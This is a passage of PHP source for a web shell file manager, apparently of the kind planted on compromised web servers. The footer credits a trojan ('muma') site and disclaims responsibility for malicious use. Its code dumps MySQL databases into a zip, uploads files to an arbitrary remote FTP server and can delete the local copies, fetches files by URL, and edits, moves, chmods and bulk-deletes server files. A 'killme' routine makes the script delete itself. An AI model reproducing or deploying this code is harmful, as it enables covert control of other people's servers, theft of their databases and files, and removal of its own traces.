href=".$meurl."?op=home>\xb5\xe3\xbb\xf7\xd5\xe2\xc0\xef\xd6\xd8\xd0\xc2\xb5\xc7\xc2\xbc.</a>";\r\n    mainbottom();\r\n}\r\n/****************************************************************/\r\n/* function mainbottom()                                        */\r\n/*                                                              */\r\n/* \xd2\xb3\xc3\xe6\xb5\xd7\xb2\xbf\xb5\xc4\xb0\xe6\xc8\xa8\xc9\xf9\xc3\xf7                                           */\r\n/****************************************************************/\r\nfunction mainbottom() {\r\n    echo "</table></table>\\n"\r\n        ."\\n<div style=\'text-align:center\'>"\r\n        ."asp\xb4\xf3\xc2\xed\xb9\xd9\xcd\xf8\xa3\xbawww.asp-muma.com \xcc\xe1\xb9\xa9\xa1\xa3\xb6\xf1\xd2\xe2\xca\xb9\xd3\xc3\xb1\xbe\xb3\xcc\xd0\xf2\xcb\xf9\xb2\xfa\xc9\xfa\xb5\xc4\xb7\xa8\xc2\xc9\xba\xf3\xb9\xfb\xd3\xeb\xb1\xbe\xc8\xcb\xce\xde\xb9\xd8\xa3\xa1 \\n"\r\n        ."</html>\\n";\r\n    exit;\r\n}\r\n/****************************************************************/\r\n/* function sqlb()                                              */\r\n/*                                                              */\r\n/* First step to backup sql.                                    */\r\n/****************************************************************/\r\nfunction sqlb() {\r\nglobal $meurl;\r\n    maintop("\xca\xfd\xbe\xdd\xbf\xe2\xb1\xb8\xb7\xdd");\r\n    echo @$content \r\n        ."<table border=\\"0\\" cellpadding=\\"2\\" cellspacing=\\"0\\"></table><span class=\'error\'>**\xbe\xaf\xb8\xe6: \xd5\xe2\xbd\xab\xbd\xf8\xd0\xd0\xca\xfd\xbe\xdd\xbf\xe2\xb5\xbc\xb3\xf6\xb2\xa2\xd1\xb9\xcb\xf5\xb3\xc9mysql.zip\xb5\xc4\xb6\xaf\xd7\xf7! \xc8\xe7\xb4\xe6\xd4\xda\xb8\xc3\xce\xc4\xbc\xfe,\xb8\xc3\xce\xc4\xbc\xfe\xbd\xab\xb1\xbb\xb8\xb2\xb8\xc7!**</span><br><br><form action=\\"".$meurl."?op=sqlbackup\\" method=\\"POST\\">\\n<label for=\\"ip\\">\xca\xfd\xbe\xdd\xbf\xe2\xb5\xd8\xd6\xb7:  </label><input id=\\"ip\\" name=\\"ip\\" size=\\"30\\" class=\\"text\\"/><br><label for=\\"sql\\">\xca\xfd\xbe\xdd\xbf\xe2\xc3\xfb\xb3\xc6:  </label><input id=\\"sql\\" name=\\"sql\\" size=\\"30\\" class=\\"text\\"/><br><label for=\\"username\\">\xca\xfd\xbe\xdd\xbf\xe2\xd3\xc3\xbb\xa7:  </label><input id=\\"username\\" name=\\"username\\" size=\\"30\\" class=\\"text\\"/><br><label for=\\"password\\">\xca\xfd\xbe\xdd\xbf\xe2\xc3\xdc\xc2\xeb:  </label><input id=\\"password\\" name=\\"password\\" size=\\"30\\" class=\\"text\\"/><br>\xca\xfd\xbe\xdd\xbf\xe2\xb1\xe0\xc2\xeb:  <select id=\\"chset\\"><option id=\\utf8\\">utf8</option></select><br><input name=\\"submit\\" class=\\"button\\" value=\\"\xb1\xb8\xb7\xdd\\" type=\\"submit\\" /></form>\\n";\r\n    mainbottom();\r\n}\r\n/****************************************************************/\r\n/* function sqlbackup()                                         */\r\n/*                                                              */\r\n/* Second step in backup sql.                                   */\r\n/****************************************************************/\r\nfunction sqlbackup($ip,$sql,$username,$password) {\r\nglobal $meurl;\r\n    if(class_exists(\'ZipArchive\')){\r\n    maintop("\xca\xfd\xbe\xdd\xbf\xe2\xb1\xb8\xb7\xdd");\r\n    $database=$sql;//\xca\xfd\xbe\xdd\xbf\xe2\xc3\xfb\r\n    $options=array(\r\n        \'hostname\' => $ip,//ip\xb5\xd8\xd6\xb7\r\n        \'charset\' => \'utf8\',//\xb1\xe0\xc2\xeb\r\n        \'filename\' => $database.\'.sql\',//\xce\xc4\xbc\xfe\xc3\xfb\r\n        \'username\' => $username,\r\n        \'password\' => $password\r\n    );\r\n    mysql_connect($options[\'hostname\'],$options[\'username\'],$options[\'password\'])or die("\xb2\xbb\xc4\xdc\xc1\xac\xbd\xd3\xca\xfd\xbe\xdd\xbf\xe2!");\r\n    mysql_select_db($database) or die("\xca\xfd\xbe\xdd\xbf\xe2\xc3\xfb\xb3\xc6\xb4\xed\xce\xf3!");\r\n    mysql_query("SET NAMES \'{$options[\'charset\']}\'");\r\n    $tables = list_tables($database);\r\n    $filename = sprintf($options[\'filename\'],$database);\r\n    $fp = fopen($filename, \'w\');\r\n    foreach ($tables as $table) {\r\n        dump_table($table, $fp);\r\n    }\r\n    fclose($fp);\r\n    //\xd1\xb9\xcb\xf5sql\xce\xc4\xbc\xfe\r\n        if (file_exists(\'mysql.zip\')) {\r\n            unlink(\'mysql.zip\'); \r\n        }\r\n        $file_name=$options[\'filename\'];\r\n        $zip = new ZipArchive;\r\n        $res = $zip->open(\'mysql.zip\', ZipArchive::CREATE);\r\n        if ($res === TRUE) {\r\n            $zip->addfile($file_name);\r\n            $zip->close();\r\n        //\xc9\xbe\xb3\xfd\xb7\xfe\xce\xf1\xc6\xf7\xc9\xcf\xb5\xc4sql\xce\xc4\xbc\xfe\r\n            unlink($file_name);\r\n        echo \'\xca\xfd\xbe\xdd\xbf\xe2\xb5\xbc\xb3\xf6\xb2\xa2\xd1\xb9\xcb\xf5\xcd\xea\xb3\xc9\xa3\xa1\'\r\n            ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        }else{\r\n            printerror(\'\xce\xde\xb7\xa8\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe\xa3\xa1\');\r\n        }\r\n    exit;\r\n    mainbottom();\r\n    }else{\r\n    printerror(\'\xb4\xcb\xb7\xfe\xce\xf1\xc6\xf7\xc9\xcf\xb5\xc4PHP\xb2\xbb\xd6\xa7\xb3\xd6ZipArchive\xa3\xac\xce\xde\xb7\xa8\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe\xa3\xa1\');\r\n    }\r\n}\r\nfunction list_tables($database)\r\n{\r\n    $rs = mysql_query("SHOW TABLES FROM $database");\r\n    $tables = array();\r\n    while ($row = mysql_fetch_row($rs)) {\r\n        $tables[] = $row[0];\r\n    }\r\n    mysql_free_result($rs);\r\n    return $tables;\r\n}\r\n//\xb5\xbc\xb3\xf6\xca\xfd\xbe\xdd\xbf\xe2\r\nfunction dump_table($table, $fp = null)\r\n{\r\n    $need_close = false;\r\n    if (is_null($fp)) {\r\n        $fp = fopen($table . \'.sql\', \'w\');\r\n        $need_close = true;\r\n    }\r\n$a=mysql_query("show create table `{$table}`");\r\n$row=mysql_fetch_assoc($a);fwrite($fp,$row[\'Create Table\'].\';\');//\xb5\xbc\xb3\xf6\xb1\xed\xbd\xe1\xb9\xb9\r\n    $rs = mysql_query("SELECT * FROM `{$table}`");\r\n    while ($row = mysql_fetch_row($rs)) {\r\n        fwrite($fp, get_insert_sql($table, $row));\r\n    }\r\n    mysql_free_result($rs);\r\n    if ($need_close) {\r\n        fclose($fp);\r\n    }\r\n}\r\n//\xb5\xbc\xb3\xf6\xb1\xed\xca\xfd\xbe\xdd\r\nfunction get_insert_sql($table, $row)\r\n{\r\n    $sql = "INSERT INTO `{$table}` VALUES (";\r\n    $values = array();\r\n    foreach ($row as $value) {\r\n        $values[] = "\'" . mysql_real_escape_string($value) . "\'";\r\n    }\r\n    $sql .= implode(\', \', $values) . ");";\r\n    return $sql;\r\n}\r\nfunction killme($dename) {\r\n    global $folder;\r\n    if (!$dename == "") {\r\n        if(unlink($folder.$dename)) {\r\n        maintop("\xd7\xd4\xc9\xb1");\r\n            echo "\xd7\xd4\xc9\xb1\xb3\xc9\xb9\xa6\xa3\xa1 "\r\n                ." <a href=".$folder.">\xb7\xb5\xbb\xd8\xcd\xf8\xd5\xbe\xca\xd7\xd2\xb3</a>\\n";\r\n            mainbottom();\r\n        }else{\r\n            printerror("\xd7\xd4\xc9\xb1\xca\xa7\xb0\xdc\xa3\xac\xc7\xeb\xbc\xec\xb2\xe9\xce\xc4\xbc\xfe\xc8\xa8\xcf\xde\xa3\xa1");\r\n        }    }else{\r\n        home();\r\n    }\r\n}\r\n/****************************************************************/\r\n/* function ftpa()                                              */\r\n/*                                                              */\r\n/* First step to backup sql.                                    */\r\n/****************************************************************/\r\nfunction ftpa() {\r\nglobal $meurl;\r\n    maintop("FTP\xb1\xb8\xb7\xdd");\r\n    echo @$content\r\n        ."<table border=\\"0\\" cellpadding=\\"2\\" cellspacing=\\"0\\"></table><span class=\'error\'>**\xbe\xaf\xb8\xe6: \xd5\xe2\xbd\xab\xb0\xd1\xce\xc4\xbc\xfe\xd4\xb6\xb3\xcc\xc9\xcf\xb4\xab\xb5\xbd\xc6\xe4\xcb\xfbftp! \xc8\xe7\xc4\xbf\xc2\xbc\xb4\xe6\xd4\xda\xb8\xc3\xce\xc4\xbc\xfe,\xce\xc4\xbc\xfe\xbd\xab\xb1\xbb\xb8\xb2\xb8\xc7!**</span><br><br><form action=\\"".$meurl."?op=ftpall\\" method=\\"POST\\"><label for=\\"ftpip\\">FTP \xb5\xd8\xd6\xb7:  </label><input id=\\"ftpip\\" name=\\"ftpip\\" size=\\"30\\" class=\\"text\\" value=\\"127.0.0.1:21\\"/><br><label for=\\"ftpuser\\">FTP \xd3\xc3\xbb\xa7:  </label><input id=\\"ftpuser\\" name=\\"ftpuser\\" size=\\"30\\" class=\\"text\\"/><br><label for=\\"ftppass\\">FTP \xc3\xdc\xc2\xeb:  </label><input id=\\"ftppass\\" name=\\"ftppass\\" size=\\"30\\" class=\\"text\\"/><br><label for=\\"goto\\">\xc9\xcf\xb4\xab\xc4\xbf\xc2\xbc:  </label><input id=\\"goto\\" name=\\"goto\\" size=\\"30\\" class=\\"text\\" value=\\"./htdocs/\\"/><br><label for=\\"ftpfile\\">\xc9\xcf\xb4\xab\xce\xc4\xbc\xfe:  </label><input id=\\"ftpfile\\" name=\\"ftpfile\\" size=\\"30\\" class=\\"text\\" value=\\"allbackup.zip\\"/><br><input name=\\"submit\\" class=\\"button\\" value=\\"\xd4\xb6\xb3\xcc\xc9\xcf\xb4\xab\\" type=\\"submit\\" /><input type=\\"checkbox\\" name=\\"del\\" id=\\"del\\"value=\\"checkbox\\"><label for=\\"del\\"><abbr title=\'FTP\xc9\xcf\xb4\xab\xba\xf3\xc9\xbe\xb3\xfd\xb1\xbe\xb5\xd8\xce\xc4\xbc\xfe\'>\xc9\xbe\xb3\xfd</abbr></label></form>\\n";\r\n    mainbottom();\r\n}\r\n/****************************************************************/\r\n/* function ftpall()                                         */\r\n/*                                                              */\r\n/* Second step in backup sql.                                   */\r\n/****************************************************************/\r\nfunction ftpall($ftpip,$ftpuser,$ftppass,$ftpdir,$ftpfile,$del) {\r\nglobal $meurl;\r\n$ftpfile = iconv("UTF-8", "GBK", $ftpfile);\r\n    maintop("FTP\xc9\xcf\xb4\xab");\r\n    $ftpip=explode(\':\', $ftpip);\r\n    $ftp_server=$ftpip[\'0\'];//\xb7\xfe\xce\xf1\xc6\xf7\r\n    $ftp_user_name=$ftpuser;//\xd3\xc3\xbb\xa7\xc3\xfb\r\n    $ftp_user_pass=$ftppass;//\xc3\xdc\xc2\xeb\r\n    if(empty($ftpip[\'1\'])){\r\n    $ftp_port=\'21\';\r\n    }else{\r\n    $ftp_port=$ftpip[\'1\'];//\xb6\xcb\xbf\xda\r\n    }\r\n    $ftp_put_dir=$ftpdir;//\xc9\xcf\xb4\xab\xc4\xbf\xc2\xbc\r\n    $ffile=$ftpfile;//\xc9\xcf\xb4\xab\xce\xc4\xbc\xfe\r\n    $ftp_conn_id = ftp_connect($ftp_server,$ftp_port);\r\n    $ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);\r\n    if((!$ftp_conn_id) || (!$ftp_login_result)) {\r\n        echo "\xc1\xac\xbd\xd3\xb5\xbdftp\xb7\xfe\xce\xf1\xc6\xf7\xca\xa7\xb0\xdc";\r\n        exit;\r\n    }else{\r\n        ftp_pasv ($ftp_conn_id,true); //\xb7\xb5\xbb\xd8\xd2\xbb\xcf\xc2\xc4\xa3\xca\xbd\xa3\xac\xd5\xe2\xbe\xe4\xba\xdc\xc6\xe6\xb9\xd6\xa3\xac\xd3\xd0\xd0\xa9ftp\xb7\xfe\xce\xf1\xc6\xf7\xd2\xbb\xb6\xa8\xd0\xe8\xd2\xaa\xd6\xb4\xd0\xd0\xd5\xe2\xbe\xe4\r\n        ftp_chdir($ftp_conn_id, $ftp_put_dir);\r\n        $ffile=explode(\',\', $ffile);\r\n        foreach ($ffile as $v) {\r\n        $ftp_upload = ftp_put($ftp_conn_id,$v,$v, FTP_BINARY);\r\n        if ($del == \'del\') {\r\n        unlink(\'./\'.$v);\r\n        }\r\n        }\r\n        ftp_close($ftp_conn_id); //\xb6\xcf\xbf\xaa\r\n    }\r\n    $ftpfile = iconv("GBK", "UTF-8", $ftpfile);\r\n    echo "\xce\xc4\xbc\xfe ".$ftpfile." \xc9\xcf\xb4\xab\xb3\xc9\xb9\xa6\\n"\r\n        ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n    mainbottom();\r\n}\r\n/****************************************************************/\r\n/* function printerror()                                        */\r\n/*                                                              */\r\n/* \xd3\xc3\xd3\xda\xcf\xd4\xca\xbe\xb4\xed\xce\xf3\xd0\xc5\xcf\xa2\xb5\xc4\xba\xaf\xca\xfd                                       */\r\n/* $error\xce\xaa\xcf\xd4\xca\xbe\xb5\xc4\xcc\xe1\xca\xbe                                           */\r\n/****************************************************************/\r\nfunction printerror($error) {\r\n    maintop("\xb4\xed\xce\xf3");\r\n    echo "<span class=error>\\n".$error."\\n</span>"\r\n        ." <a onclick=\\"history.go(-1);\\" style=\\"cursor:pointer\\">\xb7\xb5\xbb\xd8\xc9\xcf\xd2\xbb\xb2\xbd</a>\\n";\r\n    mainbottom();\r\n}\r\n/****************************************************************/\r\n/* function deleteall()                                         */\r\n/*                                                              */\r\n/* 2014-3-9 Add by Jooies                                       */\r\n/* \xca\xb5\xcf\xd6\xce\xc4\xbc\xfe\xb5\xc4\xc5\xfa\xc1\xbf\xc9\xbe\xb3\xfd\xb9\xa6\xc4\xdc                                       */\r\n/****************************************************************/\r\nfunction deleteall($dename) {\r\n    if (!$dename == "") {\r\n    $udename = $dename;\r\n    $dename = iconv("UTF-8", "GBK",$dename);\r\n        if (is_dir($dename)) {\r\n            if(is_empty_dir($dename)){ \r\n                rmdir($dename);\r\n                echo "<span>".$udename." \xd2\xd1\xbe\xad\xb1\xbb\xc9\xbe\xb3\xfd</span><br>";\r\n            }else{\r\n                deltree($dename);\r\n                rmdir($dename);\r\n                echo "<span>".$udename." \xd2\xd1\xbe\xad\xb1\xbb\xc9\xbe\xb3\xfd</span><br>";\r\n            }\r\n        }else{\r\n            if(@unlink($dename)) {\r\n                echo \'<span>\'.$udename." \xd2\xd1\xbe\xad\xb1\xbb\xc9\xbe\xb3\xfd</span><br>";\r\n            }else{\r\n                echo("<span class=\'error\'>\xce\xde\xb7\xa8\xc9\xbe\xb3\xfd\xce\xc4\xbc\xfe\xa3\xba$udename \xa3\xac\xbf\xc9\xc4\xdc\xca\xc7\xce\xc4\xbc\xfe\xb2\xbb\xb4\xe6\xd4\xda\xa3\xa1</span><br>");\r\n            }\r\n        }\r\n    }\r\n}\r\nif(@$_POST[\'action\']==\'\xc9\xbe\xb3\xfd\'){\r\n    if(isset($_POST[\'select_item\'])){\r\n    maintop("\xc9\xbe\xb3\xfd");\r\n        if(@$_POST[\'select_item\'][\'d\']){\r\n            foreach($_POST[\'select_item\'][\'d\'] as $val){\r\n                deleteall($val);\r\n            }\r\n        }\r\n        if(@$_POST[\'select_item\'][\'f\']){\r\n            foreach($_POST[\'select_item\'][\'f\'] as $val){\r\n                if(deleteall($val)){}\r\n            }\r\n        }\r\n        echo "<a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        mainbottom();\r\n    }else{\r\n        printerror("\xc4\xfa\xc3\xbb\xd3\xd0\xd1\xa1\xd4\xf1\xce\xc4\xbc\xfe");\r\n    }\r\n}\r\nif(@$_POST[\'action\']==\'\xd2\xc6\xb6\xaf\'){\r\n    if(isset($_POST[\'select_item\'])){\r\n    maintop("\xc5\xfa\xc1\xbf\xd2\xc6\xb6\xaf");\r\n    $file = \'\';\r\n        if(@$_POST[\'select_item\'][\'d\']){\r\n            foreach($_POST[\'select_item\'][\'d\'] as $key => $val){\r\n                $file = $file.$key.\',\';\r\n            }\r\n        }\r\n        if(@$_POST[\'select_item\'][\'f\']){\r\n            foreach($_POST[\'select_item\'][\'f\'] as $key => $val){\r\n                $file = $file.$key.\',\';\r\n            }\r\n        }\r\n        $file = substr($file,0,-1);\r\n    echo "<form action=\\"".$meurl."?op=movall\\" method=\\"post\\">";\r\n    echo \'<input type="hidden" name="file" value="\'.$file.\'"><input type="hidden" name="folder" value="\'.$_SESSION[\'folder\'].\'">\xc4\xfa\xbd\xab\xb0\xd1\xcf\xc2\xc1\xd0\xce\xc4\xbc\xfe\xd2\xc6\xb6\xaf\xb5\xbd\xa3\xba\'\r\n        ."<input type=\\"text\\" class=\\"text\\" name=\\"ndir\\" value=\\"".$_SESSION[\'folder\']."\\"><br>\\n"\r\n        .$file;\r\n        echo "<br><input type=\\"submit\\" value=\\"\xd2\xc6\xb6\xaf\\" border=\\"0\\" class=\\"button\\"> <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        mainbottom();\r\n    }else{\r\n        printerror("\xc4\xfa\xc3\xbb\xd3\xd0\xd1\xa1\xd4\xf1\xce\xc4\xbc\xfe");\r\n    }\r\n}\r\nif(@$_POST[\'action\']==\'\xb8\xb4\xd6\xc6\'){\r\n    if(isset($_POST[\'select_item\'])){\r\n    maintop("\xb8\xb4\xd6\xc6");\r\n    $file = \'\';\r\n        if(@$_POST[\'select_item\'][\'d\']){\r\n            foreach($_POST[\'select_item\'][\'d\'] as $key => $val){\r\n                $file = $file.$key.\',\';\r\n            }\r\n        }\r\n        if(@$_POST[\'select_item\'][\'f\']){\r\n            foreach($_POST[\'select_item\'][\'f\'] as $key => $val){\r\n                $file = $file.$key.\',\';\r\n            }\r\n        }\r\n        $file = substr($file,0,-1);\r\n    echo "<form action=\\"".$meurl."?op=copy\\" method=\\"post\\">";\r\n    echo \'<input type="hidden" name="file" value="\'.$file.\'"><input type="hidden" name="folder" value="\'.$_SESSION[\'folder\'].\'">\xc4\xfa\xbd\xab\xb0\xd1\xcf\xc2\xc1\xd0\xce\xc4\xbc\xfe\xb8\xb4\xd6\xc6\xb5\xbd\xa3\xba\'\r\n        ."<input type=\\"text\\" class=\\"text\\" name=\\"ndir\\" value=\\"".$_SESSION[\'folder\']."\\"><br>\\n"\r\n        .$file;\r\n        echo "<br><input type=\\"submit\\" value=\\"\xb8\xb4\xd6\xc6\\" border=\\"0\\" class=\\"button\\"> <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        mainbottom();\r\n    }else{\r\n        printerror("\xc4\xfa\xc3\xbb\xd3\xd0\xd1\xa1\xd4\xf1\xce\xc4\xbc\xfe");\r\n    }\r\n}\r\nif(@$_POST[\'action\']==\'\xd1\xb9\xcb\xf5\'){\r\n    if(isset($_POST[\'select_item\'])){\r\n    if(class_exists(\'ZipArchive\')){\r\n    maintop("\xc4\xbf\xc2\xbc\xd1\xb9\xcb\xf5");\r\n        class Zipper extends ZipArchive {\r\n            public function addDir($path) {\r\n                if(@$_POST[\'select_item\'][\'d\']){\r\n                    foreach($_POST[\'select_item\'][\'d\'] as $key => $val){\r\n                    $val = substr($val,2);\r\n                    $val = iconv("UTF-8", "GBK",$val);\r\n                    $this->addDir2($val);\r\n                    }\r\n                }\r\n                if(@$_POST[\'select_item\'][\'f\']){\r\n                    foreach($_POST[\'select_item\'][\'f\'] as $key => $val){\r\n                    $val = substr($val,2);\r\n                    echo $val.\'<br>\';\r\n                        $this->addFile($val);\r\n                    }\r\n                    $this->deleteName(\'./\');\r\n                }\r\n            }\r\n            public function addDir2($path) {\r\n                $nval = iconv("GBK", "UTF-8",$path);\r\n                echo $nval.\'<br>\';\r\n                $this->addEmptyDir($path);\r\n                $dr = opendir($path);\r\n                $i=0;\r\n                while (($file = readdir($dr)) !== false)\r\n                {\r\n                if($file!==\'.\' && $file!==\'..\'){\r\n                    $nodes[$i] = $path.\'/\'.$file;\r\n                    $i++;\r\n                    }\r\n                }\r\n                closedir($dr);\r\n                foreach ($nodes as $node) {\r\n                $nnode = iconv("GBK", "UTF-8",$node);\r\n                    echo $nnode . \'<br>\';\r\n                    if (is_dir($node)) {\r\n                        $this->addDir2($node);\r\n                    }elseif(is_file($node)){\r\n                        $this->addFile($node);\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        $zip = new Zipper;\r\n        $time = date(\'D-d-M-g-h\',$_SERVER[\'REQUEST_TIME\']);\r\n        $res = $zip->open($_SESSION[\'folder\'].\'Backup-\'.$time.\'.zip\', ZipArchive::CREATE);\r\n        if ($res === TRUE) {\r\n        $f = substr($_SESSION[\'folder\'], 0, -1);\r\n            $zip->addDir($f);\r\n            $zip->close();\r\n            echo "\xd1\xb9\xcb\xf5\xcd\xea\xb3\xc9 \xce\xc4\xbc\xfe\xb1\xa3\xb4\xe6\xce\xaaBackup-".$time.".zip<br>\xc4\xe3\xbf\xc9\xd2\xd4 <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb2\xe9\xbf\xb4\xce\xc4\xbc\xfe\xbc\xd0</a> \xbb\xf2\xd5\xdf <a href=\\"".$meurl."?op=home\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        }else{\r\n            echo \'<span class="error">\xd1\xb9\xcb\xf5\xca\xa7\xb0\xdc\xa3\xa1</span>\'\r\n                ." <a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        }\r\n        mainbottom();\r\n    }else{\r\n    printerror(\'\xb4\xcb\xb7\xfe\xce\xf1\xc6\xf7\xc9\xcf\xb5\xc4PHP\xb2\xbb\xd6\xa7\xb3\xd6ZipArchive\xa3\xac\xce\xde\xb7\xa8\xd1\xb9\xcb\xf5\xce\xc4\xbc\xfe\xa3\xa1\');\r\n    }\r\n    }else{\r\n        printerror("\xc4\xfa\xc3\xbb\xd3\xd0\xd1\xa1\xd4\xf1\xce\xc4\xbc\xfe");\r\n    }\r\n}\r\nif(@$_POST[\'action\']==\'\xc8\xa8\xcf\xde\'){\r\n    if(isset($_POST[\'select_item\'])){\r\n    maintop("\xd0\xde\xb8\xc4\xc8\xa8\xcf\xde");\r\n    $chmod = octdec($_REQUEST[\'chmod\']);\r\n        function ChmodMine($file, $chmod)\r\n        {\r\n        $nfile = $file;\r\n        $file = iconv("UTF-8", "GBK",$file);\r\n        if(is_file($file)){\r\n                if(@chmod($file, $chmod)){\r\n                echo $nfile.\' \xc8\xa8\xcf\xde\xd0\xde\xb8\xc4\xb3\xc9\xb9\xa6<br>\';\r\n                }else{\r\n                echo \'<span class="error">\'.$nfile.\' \xc8\xa8\xcf\xde\xd0\xde\xb8\xc4\xca\xa7\xb0\xdc</span><br>\';\r\n                }\r\n        }elseif(is_dir($file)){\r\n                if(@chmod($file, $chmod)){\r\n                echo $nfile.\' \xc8\xa8\xcf\xde\xd0\xde\xb8\xc4\xb3\xc9\xb9\xa6<br>\';\r\n                }else{\r\n                echo \'<span class="error">\'.$nfile.\' \xc8\xa8\xcf\xde\xd0\xde\xb8\xc4\xca\xa7\xb0\xdc</span><br>\';\r\n                }\r\n        $foldersAndFiles = @scandir($file);\r\n        $entries = @array_slice($foldersAndFiles, 2);\r\n        foreach($entries as $entry){\r\n        $nentry = iconv("GBK", "UTF-8",$entry);\r\n        ChmodMine($nfile.\'/\'.$nentry, $chmod);\r\n        }\r\n        }else{\r\n        echo \'<span class="error">\'.$nfile.\' \xce\xc4\xbc\xfe\xb2\xbb\xb4\xe6\xd4\xda\xa3\xa1</span><br>\';\r\n        }\r\n        }\r\n        if(@$_POST[\'select_item\'][\'d\']){\r\n            foreach($_POST[\'select_item\'][\'d\'] as $val){\r\n                ChmodMine($val,$chmod);\r\n            }\r\n        }\r\n        if(@$_POST[\'select_item\'][\'f\']){\r\n            foreach($_POST[\'select_item\'][\'f\'] as $val){\r\n                ChmodMine($val,$chmod);\r\n            }\r\n        }\r\n        echo "<a href=\\"".$meurl."?op=home&folder=".$_SESSION[\'folder\']."\\">\xb7\xb5\xbb\xd8\xce\xc4\xbc\xfe\xb9\xdc\xc0\xed</a>\\n";\r\n        mainbottom();\r\n    }else{\r\n        printerror("\xc4\xfa\xc3\xbb\xd3\xd0\xd1\xa1\xd4\xf1\xce\xc4\xbc\xfe");\r\n    }\r\n}\r\n/****************************************************************/\r\n/* function switch()                                            */\r\n/*                                                              */\r\n/* Switches functions.                                          */\r\n/* Recieves $op() and switches to it                            *.\r\n/****************************************************************/\r\nswitch($op) {\r\n    case "home":\r\n    home();\r\n    break;\r\n    case "up":\r\n    up();\r\n    break;\r\n    case "yupload":\r\n    if(!isset($_REQUEST[\'url\'])){\r\n    printerror(\'\xc4\xfa\xc3\xbb\xd3\xd0\xca\xe4\xc8\xeb\xce\xc4\xbc\xfe\xb5\xd8\xd6\xb7\xa3\xa1\');\r\n    }elseif(isset($_REQUEST[\'ndir\'])){\r\n        yupload($_REQUEST[\'url\'], $_REQUEST[\'ndir\'], @$_REQUEST[\'unzip\'] ,@$_REQUEST[\'delzip\']);\r\n    }else{\r\n    yupload($_REQUEST[\'url\'], \'./\', @$_REQUEST[\'unzip\'] ,@$_REQUEST[\'delzip\']);\r\n    }\r\n    break;\r\n    case "upload":\r\n    if(!isset($_FILES[\'upfile\'])){\r\n    printerror(\'\xc4\xfa\xc3\xbb\xd3\xd0\xd1\xa1\xd4\xf1\xce\xc4\xbc\xfe\xa3\xa1\');\r\n    }elseif(isset($_REQUEST[\'ndir\'])){\r\n        upload($_FILES[\'upfile\'], $_REQUEST[\'ndir\'], @$_REQUEST[\'unzip\'] ,@$_REQUEST[\'delzip\']);\r\n    }else{\r\n    upload($_FILES[\'upfile\'], \'./\', @$_REQUEST[\'unzip\'] ,@$_REQUEST[\'delzip\']);\r\n    }\r\n    break;\r\n    case "unz":\r\n    unz($_REQUEST[\'dename\']);\r\n    break;\r\n    case "unzip":\r\n    unzip($_REQUEST[\'dename\'],$_REQUEST[\'ndir\'],@$_REQUEST[\'del\']);\r\n    break;\r\n    case "sqlb":\r\n    sqlb();\r\n    break;\r\n    case "sqlbackup":\r\n    sqlbackup($_POST[\'ip\'], $_POST[\'sql\'], $_POST[\'username\'], $_POST[\'password\']);\r\n    break;\r\n    case "ftpa":\r\n    ftpa();\r\n    break;\r\n    case "ftpall":\r\n    ftpall($_POST[\'ftpip\'], $_POST[\'ftpuser\'], $_POST[\'ftppass\'], $_POST[\'goto\'], $_POST[\'ftpfile\'], $_POST[\'del\']);\r\n    break;\r\n    case "allz":\r\n    allz();\r\n    break;\r\n    case "allzip":\r\n    allzip();\r\n    break;\r\n    case "edit":\r\n    edit($_REQUEST[\'fename\']);\r\n    break;\r\n    case "save":\r\n    save($_REQUEST[\'ncontent\'], $_REQUEST[\'fename\'], $_REQUEST[\'encode\']);\r\n    break;\r\n    case "cr":\r\n    cr();\r\n    break;\r\n    case "create":\r\n    create($_REQUEST[\'nfname\'], $_REQUEST[\'isfolder\'], $_REQUEST[\'ndir\']);\r\n    break;\r\n    case "ren":\r\n    ren($_REQUEST[\'file\']);\r\n    break;\r\n    case "rename":\r\n    renam($_REQUEST[\'rename\'], $_REQUEST[\'nrename\'], $folder);\r\n    break;\r\n    case "movall":\r\n    movall(@$_REQUEST[\'file\'], @$_REQUEST[\'ndir\'], $folder);\r\n    break;\r\n    case "copy":\r\n    tocopy(@$_REQUEST[\'file\'], @$_REQUEST[\'ndir\'], $folder);\r\n    break;\r\n    case "printerror":\r\n    printerror($error);\r\n    break;\r\n    case "logout":\r\n    logout();\r\n    break;   \r\n    case "z":\r\n    z($_REQUEST[\'dename\'],$_REQUEST[\'folder\']);\r\n    break;\r\n    case "zip":\r\n    zip($_REQUEST[\'dename\'],$_REQUEST[\'folder\']);\r\n    break;\r\n    case "killme":\r\n    killme($_REQUEST[\'dename\']);\r\n    break;\r\n    default:\r\n    home();\r\n    break;\r\n}\r\n?>'